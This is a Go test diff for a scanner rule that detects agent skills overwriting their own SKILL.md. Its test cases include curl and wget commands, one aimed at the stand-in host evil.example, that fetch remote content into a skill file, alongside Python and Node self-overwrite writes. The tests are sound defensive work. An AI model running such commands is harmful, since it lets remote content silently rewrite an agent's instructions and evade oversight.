@@ -2234,3 +2234,111 @@ func TestRawEscapeSurvivesDocumentaryProse(t *testing.T) {
 		t.Errorf("raw ESC took a documentary/code-fence penalty: confidence %v, want 1.0 (0.85 base + 0.15 prose bonus, no penalty)", got[0].Confidence)
 	}
 }
+
+// TestSelfModificationCoversShellAndNodeForms is the first polish of
+// SG-ROGUE-001 (cycle 65). The corpus audit reframed the rule: a write whose
+// target is a `SKILL.md` is, in 777 real skills, *overwhelmingly a skill
+// generator* — `evolver`/`capability-evolver` emitting
+// `path.join(outDir, 'SKILL.md')`, a test helper writing fixture bundles,
+// `extract-skill.sh` heredoc-ing a freshly extracted skill. All 8 real writes
+// were authoring and the rule's only 2 findings were both false positives, so
+// the bare filename is not the signal. What separates self-modification from
+// authoring is where the replacement content comes from and which bundle is
+// overwritten. The benign rows are verbatim corpus excerpts.
+func TestSelfModificationCoversShellAndNodeForms(t *testing.T) {
+	packs, _ := Builtin()
+	var r *Rule
+	for _, p := range packs {
+		for _, rr := range p.Rules {
+			if rr.ID == "SG-ROGUE-001" {
+				r = rr
+			}
+		}
+	}
+	if r == nil {
+		t.Fatal("SG-ROGUE-001 not found")
+	}
+	cases := []struct {
+		text string
+		want bool
+	}{
+		// (a) remote fetch -> overwrite. The real corpus true positive, verbatim
+		// from clawhub/security-sentinel-skill/install.sh:105.
+		{`    $DOWNLOAD_CMD "$GITHUB_RAW_URL/SKILL.md" > "$INSTALL_DIR/SKILL.md"`, true},
+		{`curl -fsSL "$URL/SKILL.md" > "$SKILL_DIR/SKILL.md"`, true},
+		{`wget -qO- https://x.io/s.md > SKILL.md`, true},
+		{`curl https://evil.example/new.md > ./SKILL.md`, true},
+		// (b)/(c) python self-referential writes. `./` and the pathlib form were
+		// both unreachable before: the old leaf required the quote to be
+		// immediately followed by `SKILL.md`, and `write_text(` never saw a
+		// filename that precedes it.
+		{`open('SKILL.md', 'w').write(payload)`, true},
+		{`open('./SKILL.md', 'w').write(payload)`, true},
+		{`Path('SKILL.md').write_text(payload)`, true},
+		{`open(os.path.join(os.path.dirname(__file__), 'SKILL.md'), 'w')`, true},
+		// (d) node. `writeFileSync` is the common form and was missed entirely,
+		// because the old leaf anchored `\(` directly after `writeFile`.
+		{`fs.writeFile('SKILL.md', payload, cb)`, true},
+		{`fs.writeFileSync('SKILL.md', payload)`, true},
+		{`fs.writeFileSync(path.join(__dirname, 'SKILL.md'), payload)`, true},
+		// Confirmed corpus false positives — the authoring register. A write
+		// into a `skills/<name>/SKILL.md` path is another skill being generated.
+		{"    writeFile(tmp, `plugin-src/skills/${skill.name}/SKILL.md`,", false},
+		{`    writeFile(tmp, 'plugin/skills/slm-orphan/SKILL.md', '# orphan')`, false},
+		{`  fs.writeFileSync(path.join(dir, 'SKILL.md'), md, 'utf8');`, false},
+		{`fs.writeFileSync(path.join(skillPath, 'SKILL.md'), '# ' + skillName)`, false},
+		{`        fs.writeFileSync(path.join(outDir, 'SKILL.md'), data.content, 'utf8');`, false},
+		// Prose and comments where `>` closes a placeholder rather than
+		// redirecting — 10 corpus lines look like this.
+		{"1. Create `skills/<skill-name>/SKILL.md`", false},
+		{` *     skills/<7>/SKILL.md`, false},
+		{`ls ~/.openclaw/workspace/skills/<skill-name>/SKILL.md`, false},
+		{`2) Read the corresponding ` + "`references/<module>/SKILL.md`" + ` file.`, false},
+		// A Markdown blockquote mentioning the file is not a redirect.
+		{`> Remember that the SKILL.md file is the entry point.`, false},
+		// Deliberately NOT matched: the local heredoc/`tee` form. See the rule
+		// comment — 3 of 3 corpus occurrences are `extract-skill.sh` generating
+		// a new skill, so shipping it would trade one real detection for three
+		// false positives on legitimate skill-builder bundles.
+		{`cat > "$SKILL_PATH/SKILL.md" << TEMPLATE`, false},
+	}
+	for _, c := range cases {
+		got := len(r.Evaluate("scripts", c.text)) > 0
+		if got != c.want {
+			t.Errorf("%q: got match=%v want %v", c.text, got, c.want)
+		}
+	}
+}
+
+// TestSelfModificationSuppressSurvivesPrettyPrinting pins the newline fix in
+// SG-ROGUE-001 leaf (d). `suppress` is matched against the single line the hit
+// *starts* on, so a leaf whose gap can cross a newline slips past every
+// carve-out: with `[^)]*` a pretty-printed call anchored the match on the bare
+// `writeFileSync(` line, leaving the `path.join(skillPath, …)` evidence on the
+// next line where no suppress could see it. Verbatim from
+// clawhub/feishu-evolver-wrapper/skills_monitor.js:122.
+func TestSelfModificationSuppressSurvivesPrettyPrinting(t *testing.T) {
+	packs, _ := Builtin()
+	var r *Rule
+	for _, p := range packs {
+		for _, rr := range p.Rules {
+			if rr.ID == "SG-ROGUE-001" {
+				r = rr
+			}
+		}
+	}
+	if r == nil {
+		t.Fatal("SG-ROGUE-001 not found")
+	}
+	prettyPrinted := "                fs.writeFileSync(\n" +
+		"                    path.join(skillPath, 'SKILL.md'),\n" +
+		"                    '# ' + skillName + '\\n\\n' + name + ' skill.\\n')\n"
+	if got := r.Evaluate("scripts", prettyPrinted); len(got) > 0 {
+		t.Errorf("multi-line authoring write matched (%d findings); the leaf gap must not cross a newline or suppress cannot see the destination", len(got))
+	}
+	// The single-line equivalent must still be suppressed by the same carve-out.
+	oneLine := "fs.writeFileSync(path.join(skillPath, 'SKILL.md'), body)"
+	if got := r.Evaluate("scripts", oneLine); len(got) > 0 {
+		t.Errorf("single-line authoring write matched (%d findings); the join(<dir-var>) carve-out should drop it", len(got))
+	}
+}
